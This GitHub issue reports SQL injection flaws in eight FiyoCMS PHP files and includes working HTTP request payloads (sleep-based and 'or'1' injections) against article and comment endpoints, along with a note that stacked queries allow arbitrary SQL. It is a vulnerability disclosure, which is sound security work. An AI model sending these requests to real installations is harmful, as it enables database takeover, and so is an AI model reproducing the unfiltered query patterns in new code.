[![@iflody](https://avatars.githubusercontent.com/u/14952798?u=8fac8396f412091d8c3c07082c4139c1db4b0f50&v=4&size=48)](/iflody)[iflody](https://github.com/iflody)opened [on Jul 17, 2017](https://github.com/FiyoCMS/FiyoCMS/issues/5#issue-243301697)

1. In /apps/app\_article/controller/editor.php

$\_POST['id'] has no filters and $\_POST['art\_title'] just filter the double quote. So we can inject into this SQL statement. Because it used the PDO to connect the MySQL Server, we can use stack query to execute any SQL statement.

POST /fiyo/apps/app\_article/controller/editor.php HTTP/1.1

Referer: <http://localhost>

id=" and sleep(10)&art\_title=123\

2. In /apps/app\_comment/controller/insert.php

$\_POST paraments has some meanless filter. So we can inject into this SQL statement. Because it used the PDO to connect the MySQL Server, we can use stack query to execute any SQL statement.

POST /fiyo/apps/app\_comment/controller/insert.php

Referer: <http://localhost>

send=true&name=1" or sleep(10) or "1&email=aaa@qq.com&url=11&text=11111&captcha=undefined&link=%3Fapp%3Darticle%26view%3Ditem%26id%3D184

3. In dapur/apps/app\_article/controller/article\_list.php

$\_GET[cat], $\_GET[user], $\_GET[level], $*GET['iSortCol*'.$i] are all no filters at all. So we can inject into this SQL statement. Because it used the PDO to connect the MySQL Server, we can use stack query to execute any SQL statement.

GET /fiyo/dapur/apps/app\_article/controller/article\_list.php?cat='%20orsleep(10)%20or%20'1&user=&level=&sEcho=1&iColumns=7&sColumns=&iDisplayStart=0&iDisplayLength=10&mDataProp\_0=0&mDataProp\_1=1&mDataProp\_2=2&mDataProp\_3=3&mDataProp\_4=4&mDataProp\_5=5&mDataProp\_6=6&sSearch=&bRegex=false&sSearch\_0=&bRegex\_0=false&bSearchable\_0=true&sSearch\_1=&bRegex\_1=false&bSearchable\_1=true&sSearch\_2=&bRegex\_2=false&bSearchable\_2=true&sSearch\_3=&bRegex\_3=false&bSearchable\_3=true&sSearch\_4=&bRegex\_4=false&bSearchable\_4=true&sSearch\_5=&bRegex\_5=false&bSearchable\_5=true&sSearch\_6=&bRegex\_6=false&bSearchable\_6=true&iSortCol\_0=0&sSortDir\_0=asc&iSortingCols=1&bSortable\_0=true&bSortable\_1=true&bSortable\_2=true&bSortable\_3=true&bSortable\_4=true&bSortable\_5=true&bSortable\_6=true&\_=1500268118960

Referer: <http://localhost>

4. In dapur/apps/app\_article/controller/article\_status.php

$\_GET['id'] has no filters and it will be inject into SQL statement.Because it used the PDO to connect the MySQL Server, we can use stack query to execute any SQL statement.

GET /fiyo/dapur/apps/app\_article/controller/article\_status.php?fp=1&id=1'or'1

Referer: <http://localhost>

5. In dapur/apps/app\_article/controller/comment\_status.php

$\_GET['id'] has no filters and it will be inject into SQL statement.Because it used the PDO to connect the MySQL Server, we can use stack query to execute any SQL statement.

GET /fiyo/dapur/apps/app\_article/controller/comment\_status.php?stat=1&id=1'or'1

Referer: <http://localhost>

6. In dapur/apps/app\_article/sys\_article.php

"$\_POST[parent\_id]","$\_POST[desc]","$\_POST[keys]","$\_POST[level]" has no filters and they will be inject into SQL statement.Because it used the PDO to connect the MySQL Server, we can use stack query to execute any SQL statement.

In add category and edit category they are the similar problems.

In add article and edit article there are so many paraments have been not filtered.

The attack vector is so simple and too many attact vector could be use. So I will not write the detail.

7. In dapur/apps/app\_comment/controller/comment\_status.php

$\_GET['id'] has no filters and it will be inject into SQL statement.Because it used the PDO to connect the MySQL Server, we can use stack query to execute any SQL statement.

GET /fiyo/dapur/apps/app\_comment/controller/comment\_status.php?stat=1&id=1'or'1

Referer: <http://localhost>

8. In dapur/apps/app\_comment/sys\_comment.php

In edit comment component:

$\_POST[comment], $\_POST[name], $\_POST[web], $\_POST[email], $\_POST[status], $\_POST[id] has no filters and it will be inject into SQL statement.Because it used the PDO to connect the MySQL Server, we can use stack query to execute any SQL statement.

In enable comment and disable comment component:

$\_REQUEST['id'] has no filters and it will be inject into SQL statement.Because it used the PDO to connect the MySQL Server, we can use stack query to execute any SQL statement.

The attack vector is so simple and too many attact vector could be use. So I will not write the detail.
